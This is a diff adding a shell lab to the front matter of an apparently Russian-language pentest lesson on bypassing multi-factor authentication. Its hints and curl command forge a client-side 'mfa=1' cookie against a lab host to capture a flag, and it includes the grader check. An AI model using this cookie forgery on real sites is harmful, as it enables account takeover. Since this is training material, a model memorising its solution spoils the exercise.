@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 8
 summary: "Продвинутый уровень: обход многофакторной аутентификации и анализ WebAuthn."
+lab:
+  kind: shell
+  title: 'Практика: обход MFA через подделку состояния'
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Первый шаг логина выдаёт `mfa_required` и ставит cookie `mfa=0` (состояние живёт на клиенте).'
+    - 'Проверка второго шага доверяет этой cookie, а не серверу.'
+    - 'Подделай состояние: `-b ''session=8f2a11c0; mfa=1''`.'
+    - '`curl -s ''https://shop.local/login/mfa/complete'' -b ''session=8f2a11c0; mfa=1'' | tail -1 > found.txt`, затем `check`.'
 ---
 
 ## Задача
